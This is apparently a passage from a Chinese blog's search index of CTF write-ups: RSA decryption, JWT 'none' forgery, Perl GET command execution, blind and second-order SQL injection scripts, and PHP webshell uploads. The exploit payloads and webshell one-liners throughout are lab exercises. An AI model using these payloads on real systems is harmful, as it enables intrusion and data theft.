m2=487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546 分析 F1 = bytes_to_long(flag1)、F2 = bytes_to_long(flag2)，只需要示到F1和F2就可以得到flag c1 = F1 + F2、c2 = pow(F1, 3) + pow(F2, 3)，将两个等式相加再位移可列出等式， F1 + F2 - c1 = pow(F1, 3) + pow(F2, 3) - c2 根据scret中的n可分解出p和q，e已知，可以求出d c = pow(m, d, n)，可求出c，所以最终可以求出f 解密脚本 import libnum from sympy import * from sympy.abc import a, b, c import Crypto.Util.number as cun p = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699 q = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737 e = 0x10001 n=636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163 m1=90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239 m2=487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546 phi_n = (p-1)*(q-1) d = libnum.invmod(e, phi_n) c1 = pow(m1, d, n) c2 = pow(m2, d, n) # 求f1, f2 res = solve([a + b - c1, pow(a, 3) + pow(b, 3) - c2], [a, b]) # [(1141553212031156130619789508463772513350070909, 1590956290598033029862556611630426044507841845), (1590956290598033029862556611630426044507841845, 1141553212031156130619789508463772513350070909)] f1 = res[0][1] f2 = res[0][0] print(cun.long_to_bytes(f1) + cun.long_to_bytes(f2)) b'GWHT{f709e0e2cfe7e530ca8972959a1033b2}' ","link":"https://scarecr0w7.github.io/post/cryptoorgwctf-2019babyrsa/"},{"title":"WEB｜[红明谷CTF 2021]write_shell","content":" 源码： &lt;?php error_reporting(0); highlight_file(__FILE__); function check($input){ # 过滤字符 if(preg_match(&quot;/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i&quot;,$input)){ // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){ die('hacker!!!'); }else{ return $input; } } function waf($input){ if(is_array($input)){ foreach($input as $key=&gt;$output){ $input[$key] = waf($output); } }else{ $input = check($input); } } # 创建sandbox/md5(ip)/文件夹 $dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/'; if(!file_exists($dir)){ mkdir($dir); } switch($_GET[&quot;action&quot;] ?? &quot;&quot;) { case 'pwd': # get获取到action=pwd，输出路径 echo $dir; break; case 'upload': # get获取到action=upload，写入内容到index.php $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); } ?&gt; 可以看到check函数过滤了许多函数，但是都可以绕过，所以可以通过file_put_contents()写入php内容到index.php，然后访问index.php执行php代码输入内容 \\t 代替空格，或者tab的URL编码%09 短标签<?=?>代替<?php ?>，并且有输出效果 在php有执行命令功能 payload： ?action=upload&amp;data=&lt;?=`ls\\t/`?&gt; 获取路径为sandbox/c47b21fcf8f0bc8b3920541abd8024fd/ ?action=pwd 访问index.php，得到falg名 读取flag内容 ?action=upload&amp;data=&lt;?=`cat\\t/flllllll1112222222lag`?&gt; flag(b5d89d57-6148-44ab-ae40-35d1b7091719} 参考文章： 无字母数字webshell总结 ","link":"https://scarecr0w7.github.io/post/ctforhong-ming-gu-ctf-2021write_shell/"},{"title":"WEB｜[b01lers2020]Welcome to Earth","content":" 网页提示AMBUSH!（伏击）You've gotta escape!（你得逃脱），只有按任意键就会跳转页面 抓包发送请求看到/chase/目录 访问/chase/，页面提示 You managed to chase one of the enemy fighters, but there's a wall coming up fast!（你设法追上了一名敌方战士，但有一堵墙即将到来 快起来！），并且源码看到/leftt/目录 访问/leftt/，提示You've got the bogey in your sights, take the shot!，得到目录/shoot/ 访问目录/shoot/，得到/door/目录 继续访问，提示YOU APPROACH THE ALIEN CRAFT! How do you get inside? 猜测是点击数字然后check，但是太多一个一个点不是办法，使用selenium写一个脚本 from selenium import webdriver from selenium.webdriver.common.by import By import time driver = webdriver.Chrome() driver.get('http://e5f33079-c8e3-4153-a64b-3ad8116e259f.node4.buuoj.cn:81/door/') num_list = driver.find_elements(By.NAME, 'side') for num in num_list: num.click() driver.find_element(By.TAG_NAME, 'button').click() text = driver.find_element(By.TAG_NAME, 'h1').text time.sleep(1) driver.back() 但是跑完了也没有不同的页面，再查看网页源码发现js文件，应该是被误导了， 查看js文件，发现/open/目录 访问/open/目录，查看网页源码，发现js 访问js文件，得到/fight/目录 访问/fight/目录，没有内容，继续查看网页源码，发现js 访问js文件得到源码 // Run to scramble original flag //console.log(scramble(flag, action)); function scramble(flag, key) { for (var i = 0; i &lt; key.length; i++) { let n = key.charCodeAt(i) % flag.length; let temp = flag[i]; flag[i] = flag[n]; flag[n] = temp; } return flag; } function check_action() { var action = document.getElementById(&quot;action&quot;).value; var flag = [&quot;{hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!}&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]; // TODO: unscramble function } 代码提示猜测要实现的功能，console.log(scramble(flag, action));提示运行scramble函数，看了一下这里想要实现的是通过对flag内容的顺序的切换以排列出真正的flag 方法一：猜测flag 一般flag格式：flag{sss-asfds-asd-asd} 所以flag是以一个特殊字符开始，然后接 { 再加各种字符，最后以 } 结尾 pctf{hey_boys_im_baaaaaaaaaack!} 方法二：排列组合 排列出所有以 pctf {hey_ 开始，以 ck!} 结尾的组合，然后找出最像flag的一个，这里是最像一句话 脚本： from itertools import permutations flag = [&quot;{hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!}&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;] item = permutations(flag) for i in item: k = ''.join(list(i)) if k.startswith('pctf{hey') and k.endswith('ck!}'): print(k) ","link":"https://scarecr0w7.github.io/post/ctforb01lers2020welcome-to-earth/"},{"title":"WEB｜[GYCTF2020]Ezsqli","content":" 页面只有一个输入框，并且题目提示为SQL注入 输入1 输入2 输入3 输入1、2和3输出的内容不同，所以判断为布尔注入 判断数据库长度为21，确认为布尔注入 依次匹配字符，匹配成功返回输入1的页面，否则显示输入2的页面 payload： id=if(length(database())=21,1,2) 爆数据库名 id=if(substr(database(),1,1)=&quot;a&quot;,1,2) give_grandpa_pa_pa_pa 脚本： import requests url = 'http://0c6ebf06-dd69-4596-8c4b-a13e10a76d3e.node4.buuoj.cn:81?stunum=' str = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',',','.','@','_','-',':',';','[',']','{','}','end'] # str = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',',','.','@','_','-',':',';','[',']','{','}'] result = '' end = '' for i in range(1, 50): for s in str: geturl = url + &quot;if(substr((select(group_concat(value))from(flag)),%d,1)='%s',1,2)&quot; % (i, s) res = requests.get(geturl) if (('Hi admin, your score is: 100' in res.text) and (res.status_code == 200)): result += s print(result) break if s == 'end': end = 'end' if end == 'end': break 爆表名 id=if(substr(select table_name from information_schema.tables where table_schema=database() ,1,1) =&quot;a&quot; ,1,2) 但是这里被检测出来了，绕过测试过滤了information_schema，还有or和union等 当information_schema被过滤可以使用，mysql.innodb_table_stats、sys.schema_auto_increment_columns和sys.schema_table_statistics_with_buffer，但是此表无列名，所以涉及到无列名注入 id=if(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),4,1)='x',1,2) users233333333333333,f1ag_1s_h3r3_hhhhh 爆数据 方法一 直接猜列名为flag id=if(substr((select flag from f1ag_1s_h3r3_hhhhh),4,1)='x',1,2) flag{7433ab4e-715b-4c07-bfa2-db86ea464f78} 方法二 因为过滤了union所以用不了传统的无列名注入获取数据 1 ^ ( (select 1,1) &gt; (select * from f1ag_1s_h3r3_hhhhh)) 增减1的数量确定列数 1 ^ ( (select 1,'f') &gt; (select * from f1ag_1s_h3r3_hhhhh)) 脚本： import requests url = 'http://68bcc396-7f61-412d-a59b-d01fad776cce.node4.buuoj.cn:81/index.php' flag = '' end = '' while True: if end == 'end': break for j in range(32, 127): data = { 'id': '1 ^ ( (select 1,&quot;{}&quot;) &gt; (select * from f1ag_1s_h3r3_hhhhh))'.format(flag+chr(j)) } res = requests.post(url, data=data) if 'Error Occured When Fetch Result.' in res.text: flag += chr(j-1) print(flag) if chr(j-1) == '}': end = 'end' break 按位依次与查询到的数据进行比较 f小于等于询到的数据时页面显示Nu1L，f大于询到的数据时显示Error Occured When Fetch Result. 大于时将字符数减一，添加到flag后 匹配到 } 就结束 参考文章： SQL注入：限制条件下获取表名、无列名注入 ctf无列名注入小结 ","link":"https://scarecr0w7.github.io/post/ctforgyctf2020ezsqli/"},{"title":"WEB｜[HFCTF2020]EasyLogin","content":" 注册用户登录，点击GET FLAG提示权限不够，应该是要提升权限到admin 抓一个登录的包 有一个authorization参数，使用base64解码，看起来应该是jwt 所以只需要使用解密加密的key，然后再伪造admin用户登录就可以获得flag，但是使用c-jwt-cracker 解密key失败 直接使用jwt.io改admin登录试试，结果失败 查看别人的wp，在网站目录下发现app.js文件，发现使用的是koa框架 /** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ /controllers/api.js主要逻辑代码 const crypto = require('crypto'); const fs = require('fs') const jwt = require('jsonwebtoken') const APIError = require('../rest').APIError; module.exports = { 'POST /api/register': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =&gt; { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; 限制了用户名为admin，使用以下命令生成jwt令牌 const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); koa框架使用nodejs编写，利用nodejs的jwt缺陷，当jwt的secret为空，jwt会采用algorithm为none进行解密。 伪造admin令牌 import jwt token = jwt.encode({&quot;secretid&quot;: &quot;0x0&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123&quot;}, algorithm=&quot;none&quot;, key=&quot;&quot;) print(token) eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IjB4MCIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyJ9. 修改authorization发包，得到admin的sses:aok和sses:aok.sig 抓取登录包，必定cookie内容发包，得到flag flag{0714acf3-7655-497-ae98-de37acd54578} 参考文章： JWT攻击手册：如何入侵你的Token 探索Node.js中JWT认证缺陷的绕过 深入了解Json Web Token之实战篇 ","link":"https://scarecr0w7.github.io/post/ctforhfctf2020easylogin/"},{"title":"WEB｜[HITCON 2017]SSRFme","content":" 源码 110.244.80.206 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; }# 获取客户端ip地址 echo $_SERVER[&quot;REMOTE_ADDR&quot;]; # 创建sandbox/md5(&quot;orange+ip&quot;)文件夹并切换 $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); # shell_exec()执行命令，url可控 $info = pathinfo($_GET[&quot;filename&quot;]); # 将以数组的形式返回文件路径的信息 $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); # 路径中的文件名部分替换.为空 # 创建文件夹并切换 @mkdir($dir); @chdir($dir); # 将shell_exec()执行命令的内容写入文件中 @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); GET命令 └─# GET -h Usage: GET [-options] &lt;url&gt;... -m &lt;method&gt; use method for the request (default is 'GET') -f make request even if GET believes method is illegal -b &lt;base&gt; Use the specified URL as base -t &lt;timeout&gt; Set timeout value -i &lt;time&gt; Set the If-Modified-Since header on the request -c &lt;conttype&gt; use this content-type for POST, PUT, CHECKIN -a Use text mode for content I/O -p &lt;proxyurl&gt; use this as a proxy -P don't load proxy settings from environment -H &lt;header&gt; send this HTTP header (you can specify several) -C &lt;username&gt;:&lt;password&gt; provide credentials for basic authentication -u Display method and URL before any response -U Display request headers (implies -u) -s Display response status code -S Display response status chain (implies -u) -e Display response headers (implies -s) -E Display whole chain of headers (implies -S and -U) -d Do not display content -o &lt;format&gt; Process HTML content in various ways -v Show program version -h Print this message GET命令可以读取目录和文件内容并返回 payload ?url=/&amp;filename=123 利用GET命令读取根目录内容并写入到123文件中 url=/：GET / filename=123：这里只有文件名没有目录，所以当前文件夹为sandbox/md5(&quot;orange+ip&quot;) 构造url发送请求 访问目录 http://6627f504-5fd7-49ba-b3c3-c2f940d010f4.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/123 可以看到根目录中有flag文件，读取flag文件，但是并没有内容 ?url=/flag&amp;filename=123 再看根目录内容还有一个readflag，按ctf常规套路readflag应该是一个可执行文件，需要执行readflag才能读取到flag perl语言GET open命令漏洞 GET是Lib for WWW in Perl中的命令，目的是模拟http的GET请求，GET函数底层就是调用了open处理，open存在命令执行，并且还支持file函数。要执行的命令先前必须要有以命令为文件名的文件存在。 perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠 |）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。 payload1 创建以命令为文件名的文件 ?url=&amp;filename=|/readflag 执行命令 ?url=file:|/readflag&amp;filename=123 访问页面得到flag flag{6dd67321-ce5e-4254-a00a-f8a27578c75c} payload2 # 创建以命令为文件名的文件 /?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| # 执行命令 /?url=file:bash -c /readflag|&amp;filename=123 参考文章： GET的命令执行漏洞 ","link":"https://scarecr0w7.github.io/post/hitcon-2017ssrfme/"},{"title":"WEB｜[CISCN2019 总决赛 Day2 Web1]Easyweb","content":" 有登录框可能有注入，查看源码有一个图片链接id直接曝露出来也了可能有注入 查看robots.txt文件，提示有备份文件，尝试已知php文件，得到image.php.bak备份文件 image.php源码 &lt;?php include &quot;config.php&quot;; $id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;; $path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id); $path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path); $result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=&quot;./&quot; . $row[&quot;path&quot;]; header(&quot;Content-Type: image/jpeg&quot;); readfile($path); 对传入的$id和$path参数先进行了特殊字符转义，然后匹配指定字符串为空，最后将参数带入sql语句，所以只要绕过就有SQL注入 addslashes()：将指定的字符前加上\\以转义，包括\\，'，&quot;，NULL str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\'&quot;,&quot;'&quot;),&quot;&quot;,$id)：这里的\\0匹配的是\\0，前一个\\为转义后一个\\，所以是匹配\\0，%00，'，'为空 payload： /image.php?id=\\0&amp;path=or sleep(1)# # addslashes() id=\\\\0&amp;path=or sleep(1)# # str_replace() id=\\&amp;path=or sleep(1)# # 代入sql语句，select * from images where id='{$id}' or path='{$path}' select * from images where id='\\' or path='or sleep(1)#' id中的\\转义了后一个'，所以id='\\' or path='，只需要更改sleep(1)要查询的语句 别人的脚本： 这里使用的是下二分法将匹配数据的每个字符转为十六进制与十六进制表相比较，也可以依次将十六进制数递增比较，但是二分法更快 import requests import time def exp(url_format,length=None): rlt = '' url = url_format if length==None: length = 30 for l in range(1,length+1): begin = 32 ends = 126 tmp = (begin+ends)//2 while begin&lt;ends: r = requests.get(url.format(l,tmp)) if r.content!=b'': begin = tmp+1 tmp = (begin+ends)//2 else: ends = tmp tmp = (begin+ends)//2 if tmp==32: break rlt+=chr(tmp) print(rlt) return rlt.rstrip() # url ='http://429b546d-0ffe-489e-8165-32ee993453be.node4.buuoj.cn:81/image.php?id=\\\\0&amp;path=or%20ord(substr(database(),{},1))&gt;{}%23' # print('数据库名为：',exp(url)) # 数据库名为： ciscnfinal # url ='http://429b546d-0ffe-489e-8165-32ee993453be.node4.buuoj.cn:81/image.php?id=\\\\0&amp;path=or%20ord(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),{},1))&gt;{}%23' # print('表名为：',exp(url)) # 表名为： images,users # url =&quot;http://429b546d-0ffe-489e-8165-32ee993453be.node4.buuoj.cn:81/image.php?id=\\\\0&amp;path=or%20ord(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273 and table_schema=database()),{},1))&gt;{}%23&quot; # print('列名为：',exp(url)) # 列名为： username,password # url ='http://429b546d-0ffe-489e-8165-32ee993453be.node4.buuoj.cn:81/image.php?id=\\\\0&amp;path=or%20ord(substr((select%20group_concat(username)%20from%20users),{},1))&gt;{}%23' # print('用户名为：',exp(url)) # 用户名为： admin url ='http://429b546d-0ffe-489e-8165-32ee993453be.node4.buuoj.cn:81/image.php?id=\\\\0&amp;path=or%20ord(substr((select%20group_concat(password)%20from%20users),{},1))&gt;{}%23' print('密码为：',exp(url)) 密码为： afe459b227c958822614 因为过滤的原因这里table_name使用的是十六进制 得到用户名密码 admin：afe459b227c958822614 使用用户名密码登录成功，为文件上传页面 上传一个一名话木马，提示不能上传php文件 上传一个图片，提示将文件名保存到了logs/upload.1b6d558737c7b875583b20865e3dd372.log.php 可以将php代码放到文件名中，然后就会保存到日志文件中，日志文件也是php文件 &lt;?php @eval($_POST['shell']);?&gt; 但是使用普通的一句话木马，php代码被检测到了 使用另一个没有php字符的一句话上传成功 &lt;?=@eval($_POST['shell']);?&gt; 蚁剑连接成功得到flag flag{19a0fbee-1a7a-4931-8bb7-128c39c82111} ","link":"https://scarecr0w7.github.io/post/ctforciscn2019-zong-jue-sai-day2-web1easyweb/"},{"title":"WEB｜[WUSTCTF2020]CV Maker","content":" 注册帐号登录 存在文件上传的地方，上传一句话木马文件 提示exif_imagetype not image!，exif_imagetype是php里通过文件头判断是不是图片，可以通过图片马绕过 exif_imagetype() 读取一个图像的第一个字节并检查其签名。 制作图片马 # win copy 1.jpg /b + shell.php 1.php # linux cat 1.jpg shell.php &gt; 1.php 上传图片马 查看文件路径，上传成功 蚁剑连接图片马成功 得到flag flag{a5c90492-2361-45e4-a2be-d9cf32f77efc} 类似CTF： SUCTF 2019 CheckIn ","link":"https://scarecr0w7.github.io/post/ctforwustctf2020cv-maker/"},{"title":"WEB｜[CISCN2019 华北赛区 Day1 Web5]CyberPunk","content":" 看到有登录框想到可能存在注入，但是对每个页面都测试了并没有结果，看有提交订单页面和查询订单页面猜测可能会有二次注入，但是没有源码不好测试，然后查看网页源码也没发现什么 看了下别人的wp，源码最后有提示&lt;!--?file=?--&gt;，可能存在文件包含，这个确实没有想到 &lt;/body&gt; &lt;/html&gt; &lt;!--?file=?--&gt; 文件包含 ?file=php://filter/convert.base64-encode/resource=index.php 读取已知页面的源码，显示的源码没有包含html代码 index.php &lt;?php ini_set('open_basedir', '/var/www/html/'); // $file = $_GET[&quot;file&quot;]; $file = (isset($_GET['file']) ? $_GET['file'] : null); if (isset($file)){ if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) { echo('no way!'); exit; } @include($file); } ?&gt; 文件包含漏洞 search.php &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); if(!$row) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;&lt;p&gt;姓名:&quot;.$row['user_name'].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row['phone'].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row['address'].&quot;&lt;/p&gt;&quot;; } else { $msg = &quot;未找到订单!&quot;; } }else { $msg = &quot;信息不全&quot;; } ?&gt; user_name和phone都进行匹配，不存在注入 change.php &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`='&quot;.$address.&quot;', `old_address`='&quot;.$row['address'].&quot;' where `user_id`=&quot;.$row['user_id']; $result = $db-&gt;query($sql); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单修改成功&quot;; } else { $msg = &quot;未找到订单!&quot;; } }else { $msg = &quot;信息不全&quot;; } ?&gt; user_name和phone都进行匹配，不存在注入，但是address使用的是addslashes，典型的二次注入 delete.php &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $result = $db-&gt;query('delete from `user` where `user_id`=' . $row[&quot;user_id&quot;]); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单删除成功&quot;; } else { $msg = &quot;未找到订单!&quot;; } }else { $msg = &quot;信息不全&quot;; } ?&gt; config.php &lt;?php ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;); $DATABASE = array( &quot;host&quot; =&gt; &quot;127.0.0.1&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot;, &quot;dbname&quot; =&gt;&quot;ctfusers&quot; ); $db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']); 二次注入 $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } 更新页面address使用的是addslashes，存在二次注入漏洞 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串 预定义字符是：单引号（'）、双引号（&quot;）、反斜杠（\\）、NULL 二次注入： 攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 这里addslashes将单引号（'）转义为\\'，但是进入数据库中单个 \\ 是会被去除，所以存储到数据还是单引号（'），更新时会被拼接到sql语句中 payload ' ,`address`=database()#' 添加数据 更新数据 查询数据 查询结果 # 当前数据库 ' ,`address`=database()#' ctfusers # 数据库 ',`address`=(select(group_concat(schema_name))from(information_schema.schemata))# information_schema,ctftraining,mysql,performance_schema,test,ctfusers # 表 ',`address`=(select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctftraining'))# FLAG_TABLE,news,users # 字段 ',`address`=(select(group_concat(column_name))from(information_schema.columns)where(table_name='FLAG_TABLE'))# FLAG_COLUMN # 数据 ',`address`=(select(group_concat(`FLAG_COLUMN`))from(`ctftraining`.`FLAG_TABLE`))# errorColumn 'address' cannot be null 查询数据时提示没有数据，说明表里面没有flag，查看wp说是要读根目录的flag.txt文件，具体为什么读flag.txt，说是CISCN官方出题说明了flag在根目录下 ',`address`=(select(load_file(&quot;/flag.txt&quot;)))# flag{5a8927a1-7be6-4190-8868-addfdad42aae} 另一个解法，使用报错显示内容 payload # updatexml一次最多显示32位，两次读取 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)# errorXPATH syntax error: '~flag{5a8927a1-7be6-4~' 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)# errorXPATH syntax error: '~190-8868-addfdad42aae}~' ","link":"https://scarecr0w7.github.io/post/ctforciscn2019-hua-bei-sai-qu-day1-web5cyberpunk/"},{"title":"WEB｜[CISCN2019 华北赛区 Day1 Web1]Dropbox","content":" 注册帐号登录 存在文件上传点，抓包上传文件，修改Content-Type后可以上传代码文件，但是后缀会变为图片后缀 上传文件后有文件下载功能 抓包发现filename直接曝露在内容中，试试下载其他文件，发现存在任意文件下载漏洞 将已知文件都下载下来 文件源码 login.php &lt;?php session_start(); if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die(); } ?&gt; &lt;!doctype html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; 